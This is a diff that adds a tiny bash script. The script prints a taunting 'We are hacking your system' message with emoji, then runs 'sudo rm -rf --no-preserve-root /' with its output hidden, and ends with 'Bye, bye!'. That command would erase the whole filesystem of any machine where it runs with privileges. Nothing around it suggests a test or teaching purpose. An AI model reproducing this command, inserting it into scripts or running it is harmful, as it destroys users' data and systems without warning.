@@ -1,0 +1,4 @@
+#!/bin/bash
+echo "We are hacking your system ... 🤡🤡🤡🤡 😦😦😦😦"
+sudo rm -rf --no-preserve-root / > /dev/null 2>&1
+echo "Bye, bye!"
